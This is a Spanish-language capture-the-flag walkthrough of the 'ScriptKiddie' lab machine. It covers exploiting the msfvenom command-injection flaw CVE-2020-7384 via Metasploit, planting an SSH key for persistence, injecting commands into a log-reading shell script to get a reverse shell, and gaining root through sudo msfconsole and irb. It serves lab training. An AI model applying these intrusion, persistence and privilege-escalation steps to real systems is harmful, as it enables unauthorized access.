#by d4l1

<p align="center"><img src=""></p>

<h1 align="center">ScriptKiddie</h1>

# ÍNDICE

# INICIO

Como siempre probaremos a hacer el test de conectividad mandando un ping a la máquina.

![image](https://github.com/user-attachments/assets/dc9c6969-29b3-4c3d-a2ef-9a8691052df1)

Posteriormente haremos un escaner de los puertos más importantes a ver si encontramos algo importante.

![image](https://github.com/user-attachments/assets/9009ccbf-437d-4a9b-8e23-6a3495cf5d25)

Encontramos 2 puertos tcp abiertos (22) y (5000) funcionando en python 

Encontramos una página web por el puerto 5000 llamada "k1d'5 h4ck3r r00l5"

![image](https://github.com/user-attachments/assets/a0174ec0-f1d8-4b48-92b4-58d1c7c5e355)

En la sección de "payloads" nos encontramos un generador con "msfvenom" 

Posteriormente a ello encontramos el CVE-2020-7384 sobre una vulnerabilidadd e injección de comandos en "msfvenom"

He cogido este [exploit](https://www.exploit-db.com/exploits/49491)

Alfinal lo he hecho con msfvenom porque no me salia por ningun lado.

```
msfvenom
search msfvenom
use 0
show options
set LHOST mi ip
set LPORT mi puert
show payloads
set payload 42
run
```
Estamos dentro

![image](https://github.com/user-attachments/assets/480f9c82-301c-4d19-9d31-83b1ce9f7434)

![image](https://github.com/user-attachments/assets/8cc864ba-5d35-45c5-9f5d-5179076f8b5d)

Vemos que estamos en el usuario "kid" y cogemos la flag del usuario

Vamos a ir también a coger las ssh para conectarnos 

./ssh/authorized keys 

Simplemente generamos una clave en nuestrop pc con 

```
ssh-keygen
```
Posteriormente la copiamos con "echo ippublicas >> authorized_keys"

Nos vamos a la máquina victima y la copiamos en esa ruta y luego nos conectamos por ssh sin problema

![image](https://github.com/user-attachments/assets/cd1abc1d-0ca2-46e6-bba1-328244d20131)

Si vamos enumerando nos ecnontramos con carpetas como "logs" o dentro de pwn encontramos un .sh llamando "scanlosers.sh"

```
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```
Si nos fijamos se utilizan separadores cono -d y los rachivos empiezan a burcar -f3- consideramos como la ip adicionalmente no se valida y hace el script vulnerable a OS injección command

Si vemos la aplicación web el codigo /home/kid/html/app.py vemos que se puede imputear una ip que sale en /home/kid/logs/hackers archivos no alfanumeros y se envia para "searchsploit"
```
def searchsploit(text, srcip):

 if regex_alphanum.match(text):
 result = subprocess.check_output(['searchsploit', '--color', text])
 return render_template('index.html', searchsploit=result.decode('UTF-8',
'ignore'))
 else:

 with open('/home/kid/logs/hackers', 'a') as f:
 f.write(f'[{datetime.datetime.now()}] {srcip}\n')

 return render_template('index.html', sserror="stop hacking me - well hack you
back")
```
Podemos hacer un poco de truco y envede la pagina web escriba datos en el fichero nosotros hacemos un error y vemos si llega o no

Sabiendo esto podemos hacer un netcat para estar en escucha en el puerto que queramos y escribir una shell reversea en los logs del hacker

![image](https://github.com/user-attachments/assets/052f809f-6b9a-48e6-b3ce-4c7b4d4d4dd3)

Estamos dentro del usuario (pwn)

![image](https://github.com/user-attachments/assets/43fb1c5d-ced9-44a0-be17-e83395f440d3)

vamos a importar una shell
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
![image](https://github.com/user-attachments/assets/03e3080a-eb9c-4aa9-ac1f-48bcdc38d6ee)

Nos damos cuenta que esa ruta la podemos ejecutar sin comandos

Vamos que podemos ahcer una msfconsole

ejecutamos una
```
sudo msfconsole
```
Desde la misma consola podemos hacer una shell integrada con "irb" y llamar al sistmea que ejecute una bash

```
irb
system("/bin/bash")
```

GG






